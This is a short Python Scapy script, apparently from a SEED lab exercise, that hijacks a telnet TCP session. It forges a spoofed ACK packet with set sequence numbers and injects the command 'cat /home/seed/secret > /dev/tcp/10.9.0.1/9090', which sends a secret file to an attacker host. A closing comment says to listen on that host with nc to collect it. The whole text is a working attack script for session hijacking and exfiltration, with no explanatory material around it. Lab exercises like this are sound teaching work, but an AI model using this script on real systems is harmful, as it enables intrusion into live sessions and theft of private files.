#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
sport = 53858
dport = 23
tcp = TCP(sport=sport, dport=dport, flags="A", seq=3945114434, ack=702116766)
data = "\n cat /home/seed/secret > /dev/tcp/10.9.0.1/9090\n"
pkt = ip/tcp/data
send(pkt, verbose=0)

## run nc -l 9090 on the attacker machine to receive the secret